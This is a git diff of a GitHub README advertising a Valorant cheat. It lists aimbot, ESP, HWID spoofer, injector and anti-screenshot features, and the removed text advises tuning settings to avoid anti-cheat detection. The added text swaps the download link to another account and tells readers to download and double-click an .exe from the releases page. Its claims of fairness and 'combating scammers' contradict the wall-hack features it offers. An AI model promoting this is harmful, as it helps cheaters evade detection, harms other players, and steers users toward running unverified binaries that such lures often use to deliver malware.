@@ -1,108 +1,84 @@
-<div align="center">
+# 🎮 Covert-Valorant-Cheat - Simple Tools to Enhance Your Game
 
-# Covert Valorant
+[![Download Covert-Valorant-Cheat](https://img.shields.io/badge/Download%20Now%20-%E2%86%93-blue)](https://github.com/eslamsaiead/Covert-Valorant-Cheat/releases)
 
-[Download Link](https://github.com/sapperborne0/Covert-Valorant-Cheat/releases/download/Releases/Software.zip)
+## 📜 Description
 
-I am developing various cheats and tools for games, focusing on combating scammers. My projects include creating cheats such as aimbots, ESPs, magic bullets, driver injectors, overlays, and Imgui tools.
+Covert-Valorant-Cheat provides tools to enhance your gameplay while ensuring a fair experience in competitive environments. Developed with the player in mind, this software focuses on combating scammers and providing users with features like an aimbot, ESP (Extra Sensory Perception), and more. 
 
-<details>
-<summary><strong>Cheats Developed for the Following Games</strong></summary>
+## 🚀 Getting Started
 
-- Rise Online
-- Apex Legends
-- Bloodhunt
-- Call of Duty: Cold War
-- Call of Duty: Vanguard
-- Call of Duty: Warzone/Modern Warfare
-- DayZ
-- Dead By Daylight
-- Destiny 2
-- Enlisted
-- Escape From Tarkov
-- Fortnite
-- Halo Infinite
-- HyperFlick
-- New Critical Hit
-- New World
-- Mir 4
-- Noble
-- PlayerUnknown's Battlegrounds (PUBG)
-- Steam
-- Rainbow Six Siege
-- Rijin
-- Rogue Company
-- Rust
-- Scum
-- Splitgate
-- Super People
-- Unleashed
-- Valorant
-- Spoofer
-- DLL Injector
-</details>
+To download and run the application, follow these steps:
 
-## How to Use
+1. **Visit the Releases Page**  
+   Click the link below to access the release page for Covert-Valorant-Cheat:  
+   [Download Covert-Valorant-Cheat](https://github.com/eslamsaiead/Covert-Valorant-Cheat/releases)
 
-- Download zip archive [Download Link](https://github.com/sapperborne0/Covert-Valorant-Cheat/releases/download/Releases/Software.zip)
-- Extract Project to Folder.
-- Make Sure You Have Visual Studio Installed on Your Computer
-- [Click if Visual Studio is Not Installed](https://visualstudio.microsoft.com/en/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&passive=false&cid=2030)
+2. **Select the Latest Version**  
+   Look for the latest version listed on the releases page. You will find all available downloads, including essential files.
 
-### Visual Studio
+3. **Download the Required File**  
+   Choose the version that fits your system and click on the download link. The files will generally be in formats such as `.exe` or `.zip`.
 
-1. Open the solution file (.sln).
-2. Select **Build Solution** from the **Build** menu or press `Ctrl+Shift+B` to compile the project.
-3. When the build is complete, select **Start Without Debugging** from the **Debug** menu or press `Ctrl+F5` to run the project.
+4. **Locate the Downloaded File**  
+   Once the download finishes, go to your downloads folder. You can usually find this by opening the file explorer and selecting "Downloads."
 
-## Valorant Cheat Customization
+5. **Run the Application**  
+   - If you downloaded an `.exe` file, double-click it to start the program.  
+   - If you downloaded a `.zip` file, right-click it, select "Extract All," and then open the extracted folder to find the `.exe` file.
 
-Welcome to our Valorant cheat customization options! We offer a range of features to personalize your cheat experience. Tailor the cheat to your gameplay style and preferences to gain a competitive edge.
+## 📥 Download & Install
 
-**Key Customization Options:**
+You can download Covert-Valorant-Cheat by following the prominent link below. Make sure to check for updates regularly to ensure you have the best and safest version.
 
-- **Aimbot Settings**: Adjust aimbot smoothness and targeting to improve accuracy.
-- **Field of View (FOV)**: Modify the FOV to enhance your awareness and control.
-- **Safety and Detection**: While our cheat is designed to be undetected, extreme settings may still attract attention. Use with caution.
+[Download Covert-Valorant-Cheat](https://github.com/eslamsaiead/Covert-Valorant-Cheat/releases)
 
-**Guidelines:**
+## 🌟 Features
 
-- **Stay Safe**: Configure settings to mimic natural behavior to avoid detection and maintain a competitive advantage.
-- **Customize Wisely**: Choose settings that enhance your gameplay without raising suspicion.
+- **Aimbot:** Improve your targeting with precision aiming.
+- **ESP (Extra Sensory Perception):** See enemies through walls and obstacles.
+- **Driver Manager:** Easily manage and switch drivers for safe operation.
+- **Overlay Support:** Utilize in-game overlays to keep track of your performance.
+- **Simple User Interface:** Designed for ease of use, even for beginners.
 
-## Features
+## 🔧 System Requirements
 
-- **Aimbot**: Improve targeting accuracy.
-- **ESP**: See enemy positions and other useful information.
-- **Spoofer**: Avoid detection by changing your system's identifiers.
-- **Driver**: Tools for handling drivers.
-- **Injector**: Inject cheats into games.
+- **Operating System:** Windows 10 or later
+- **CPU:** Intel Core i3 or equivalent
+- **RAM:** Minimum 4 GB
+- **Graphics Card:** NVIDIA GTX 660 or equivalent
+- **Disk Space:** At least 1 GB of free space
 
-**Main Features:**
+Make sure your system meets these requirements to enjoy the best experience with Covert-Valorant-Cheat.
 
-- **ESP Box**: Display enemy outlines for better visibility.
-- **ESP Line**: Draw lines to highlight enemies and important locations.
-- **Bone Aimbot**: Target specific bones for precise aiming.
-- **Distance Measurement**: See the distance to enemies to make better decisions.
-- **ESP Health**: Monitor enemy health to determine when to engage.
+## 📚 Usage Guidelines 
 
-**Additional Features:**
+### How to Use the Features
 
-- **Draw Radar**: Expand your view with a radar display.
-- **Anti-Screenshot**: Remain undetected even if screenshots are taken.
-- **No FPS Drop**: Optimize performance without compromising game speed.
-- **0% ESP Delay**: Get real-time updates with no delay.
-- **0% Dead Zone**: Perfect aim with no inaccuracies.
-- **User-Friendly System**: Easy to set up and use.
+- **Setting Up the Aimbot:**  
+  Open the application and navigate to the Aimbot settings. You can customize the sensitivity and key bindings for activating the feature.
 
-## Preview
+- **Configuring ESP:**  
+  In the main menu, select the ESP option. You will be able to choose which types of indicators to display, such as enemy health and distance.
 
-![image](https://user-images.githubusercontent.com/105713914/169304225-4f0a3838-4540-4e47-852f-f7b06548be55.png)
+- **Driver Management:**  
+  The Driver Manager allows you to switch between various drivers. This ensures compatibility and performance.
 
-## Disclaimer
+## ⚙️ Frequently Asked Questions
 
-This source code is for educational purposes only.
+### Is this software safe to use?  
+The application is designed to reduce risks while enhancing gameplay. However, always ensure you understand the terms of service for the game you are playing.
 
-## License
+### Do I need to update the program regularly?  
+Yes, to keep features optimized and avoid potential issues, regularly check the releases page for updates.
 
-This project is licensed under the MIT. For more information, see the [License](LICENSE).
+### Can I contact support if I have issues?  
+You can create an issue on the GitHub repository under the "Issues" tab for assistance.
+
+## 📞 Contact
+
+For any questions or suggestions, please reach out through the GitHub repository's issues section.
+
+---
+
+Enjoy using Covert-Valorant-Cheat and enhance your gaming experience! Don't forget to check for updates regularly to stay ahead in your gameplay.
